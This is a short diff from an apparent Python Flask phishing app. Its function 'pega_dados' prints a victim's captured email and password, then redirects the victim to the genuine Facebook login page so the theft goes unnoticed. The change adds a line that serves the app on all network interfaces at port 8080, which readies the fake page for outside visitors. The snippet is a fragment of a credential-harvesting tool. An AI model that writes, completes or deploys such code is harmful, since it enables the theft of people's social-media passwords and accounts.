@@ -14,4 +14,6 @@ def pega_dados():
 
     print(f"EMAIL: {email} \n senha: {senha}")
     return redirect ("https://pt-br.facebook.com/login/device-based/regular/login/")
+
+app.run(host="0.0.0.0",port="8080")
 app.run()
